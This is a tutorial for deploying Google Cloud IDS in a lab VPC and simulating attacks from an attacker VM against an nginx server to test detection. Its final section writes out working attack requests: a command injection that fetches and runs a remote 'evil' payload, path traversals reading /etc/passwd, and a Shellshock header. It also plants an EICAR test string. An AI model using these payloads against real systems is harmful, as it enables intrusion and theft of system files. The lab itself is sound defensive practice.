# GCP Cloud IDS (Intrusion Detection System)

## Objective:
+ Threat detection for intrusions, malware, spyware and command and control attacks.  Simulate multiple attacks through GCP vm sent to Cloud IDS

Steps:
```
Enable GCP APIs

Build GCP networking footprint

Create a Cloud IDS endpoint

Create Firewall rules and Cloud NAT

Create 2 virtual Machines

Confirm web service is running

Create a Cloud IDS packet mirroring Policy

Simulate and review the attacks on Cloud IDS
```

##Enable APIs
```
Set Project ID variable:
export PROJECT_ID=$(gcloud config get-value project | sed '2d')


Enable the Networking API:
gcloud services enable servicenetworking.googleapis.com \
    --project=$PROJECT_ID

Enable Cloud IDS API:
gcloud services enable ids.googleapis.com \
    --project=$PROJECT_ID

Enable Cloud Logging API:
gcloud services enable logging.googleapis.com \
    --project=$PROJECT_ID
```


##Build the GCP networking footprint
```
Create VPC:
gcloud compute networks create cloud-ids \
--subnet-mode=custom

Create subnet to the VPC for us-east1:
gcloud compute networks subnets create cloud-ids-useast1 \
--range=192.168.10.0/24 \
--network=cloud-ids \
--region=us-east1

Configure private service access:
gcloud compute addresses create cloud-ids-ips \
--global \
--purpose=VPC_PEERING \
--addresses=10.10.10.0 \
--prefix-length=24 \
--description="Cloud IDS Range" \
--network=cloud-ids

Configure private connection:
gcloud services vpc-peerings connect \
--service=servicenetworking.googleapis.com \
--ranges=cloud-ids-ips \
--network=cloud-ids \
--project=$PROJECT_ID
```

##Create Cloud IDS Endpoint
```
Create endpoint:
gcloud ids endpoints create cloud-ids-east1 \
--network=cloud-ids \
--zone=us-east1-b \
--severity=INFORMATIONAL \
--async

Verify the IDS endpoint is created:
gcloud ids endpoints list --project=$PROJECT_ID


Verification OUTPUT:
 ID: cloud-ids-east1
  LOCATION: us-east1-b
  SEVERITY: INFORMATIONAL
  STATE: CREATING
  NETWORK: cloud-ids
  TRAFFIC_LOGS:

  ```

##Create Firewall rules and the Cloud NAT
```
Create 2 firewall rules in the VPC:

Rule 1 will allow standard http port (TCP 80) and ICMP protocol to the vm
gcloud compute firewall-rules create allow-http-icmp \
--direction=INGRESS \
--priority=1000 \
--network=cloud-ids \
--action=ALLOW \
--rules=tcp:80,icmp \
--source-ranges=0.0.0.0/0 \
--target-tags=server

Rule 2 allow GC IAP Proxy IP range TCP port 22 to all vms , allowing SSH:
gcloud compute firewall-rules create allow-iap-proxy \
--direction=INGRESS \
--priority=1000 \
--network=cloud-ids \
--action=ALLOW \
--rules=tcp:22 \
--source-ranges=35.235.240.0/20


CloudRouter must be configured to a respective region.  Create the CloudRouter:
gcloud compute routers create cr-cloud-ids-useast1 \
--region=us-east1 \
--network=cloud-ids

Configure CloudNAT, this is required since the VMS dont have a public IP.  THe cloudNAT is created in the region to allow for internet access to download updates and files
gcloud compute routers nats create nat-cloud-ids-useast1 \
--router=cr-cloud-ids-useast1 \
--router-region=us-east1 \
--auto-allocate-nat-external-ips \
--nat-all-subnet-ip-ranges


```
###Create 2 virtual machines

```
Create 2 virtual machines.  Machine 1 = webserver mirroring to Cloud IDS, Machine 2 = attacker

Machine 1 mirroring to Cloud IDS:
gcloud compute instances create server \
--zone=us-east1-b \
--machine-type=e2-medium \
--subnet=cloud-ids-useast1 \
--no-address \
--private-network-ip=192.168.10.20 \
--metadata=startup-script=\#\!\ /bin/bash$'\n'sudo\ apt-get\ update$'\n'sudo\ apt-get\ -qq\ -y\ install\ nginx \
--tags=server \
--image=debian-10-buster-v20210512 \
--image-project=debian-cloud \
--boot-disk-size=10GB

Create machine 2 = attacker:
gcloud compute instances create attacker \
--zone=us-east1-b \
--machine-type=e2-medium \
--subnet=cloud-ids-useast1 \
--no-address \
--private-network-ip=192.168.10.10 \
--image=debian-10-buster-v20210512 \
--image-project=debian-cloud \
--boot-disk-size=10GB


Prepare your server (SSH into your server via IAP Proxy):
gcloud compute ssh server --zone=us-east1-b --tunnel-through-iap

```

##Confirm Webserver is up and functional
```
sudo systemctl status nginx

cd /var/www/html/

Create malware on the webserver to be detected by Cloud IDS
sudo touch eicar.file
echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' | sudo tee eicar.file


```

## From the webserver, create the Cloud IDS packet mirroring policy/rules, to determine what traffic is sent to Cloud IDS.   Attach the policy to the Cloud IDS endpoint.

```
gcloud ids endpoints list --project=$PROJECT_ID | grep STATE

IDS endpoint forwarding rule and confirm endpoint is ready:
export FORWARDING_RULE=$(gcloud ids endpoints describe cloud-ids-east1 --zone=us-east1-b --format="value(endpointForwardingRule)")
echo $FORWARDING_RULE

Create and attach the packet mirroring policy:
gcloud compute packet-mirrorings create cloud-ids-packet-mirroring \
--region=us-east1 \
--collector-ilb=$FORWARDING_RULE \
--network=cloud-ids \
--mirrored-subnets=cloud-ids-useast1

Verify policy is created:
gcloud compute packet-mirrorings list

```

##Simulate traffic attack
```
SSH to attacker vm through IAP Proxy:
gcloud compute ssh attacker --zone=us-east1-b --tunnel-through-iap


Create traffic to the webserver with various severity:

Low:
curl "http://192.168.10.20/weblogin.cgi?username=admin';cd /tmp;wget http://123.123.123.123/evil;sh evil;rm evil"

Medium:
curl http://192.168.10.20/?item=../../../../WINNT/win.ini
curl http://192.168.10.20/eicar.file

High:
curl http://192.168.10.20/cgi-bin/../../../..//bin/cat%20/etc/passwd

Critical:
curl -H 'User-Agent: () { :; }; 123.123.123.123:9999' http://192.168.10.20/cgi-bin/test-critical


```

###Cloud IDS Review:



<a href="https://drive.google.com/uc?export=view&id=1dJh-tBx4s1iQc4Jw5w7JiM52wp5u5bB8"><img src="https://drive.google.com/uc?export=view&id=1dJh-tBx4s1iQc4Jw5w7JiM52wp5u5bB8/" style="width: 500px; max-width: 100%; height: auto" title="Click for the larger version." /></a>

<a href="https://drive.google.com/uc?export=view&id=1fLzDe7tHU-ORtNuwsUXi64nQoQMvSiNL"><img src="https://drive.google.com/uc?export=view&id=1fLzDe7tHU-ORtNuwsUXi64nQoQMvSiNL/" style="width: 500px; max-width: 100%; height: auto" title="Click for the larger version." /></a>


<a href="https://drive.google.com/uc?export=view&id=1HNn1FRDE_QivNWtU_Tstbd3c6FwwOAY-"><img src="https://drive.google.com/uc?export=view&id=1HNn1FRDE_QivNWtU_Tstbd3c6FwwOAY-/" style="width: 500px; max-width: 100%; height: auto" title="Click for the larger version." /></a>


<a href="https://drive.google.com/uc?export=view&id=1kv7XtTbEJ4s6SZQvytkEzLF4Ht47nhSR"><img src="https://drive.google.com/uc?export=view&id=1kv7XtTbEJ4s6SZQvytkEzLF4Ht47nhSR/" style="width: 500px; max-width: 100%; height: auto" title="Click for the larger version." /></a>